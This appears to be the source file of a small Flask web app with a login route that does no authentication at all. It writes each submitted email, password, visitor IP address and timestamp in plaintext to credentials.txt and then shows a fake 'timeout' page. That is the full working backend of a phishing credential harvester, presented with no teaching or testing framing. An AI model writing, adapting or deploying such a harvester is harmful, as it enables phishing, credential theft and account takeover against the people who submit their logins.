from flask import Flask, render_template, request
from datetime import datetime
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)

    

    with open(os.path.join(os.path.dirname(__file__), "credentials.txt"), "a") as f:
        f.write(f"Email/Username: {email}, Password: {password}, IP Address: {ip_address}, Time: {datetime.now()}\n")

    return render_template('timeout.html')

if __name__ == '__main__':
    app.run(debug=True)
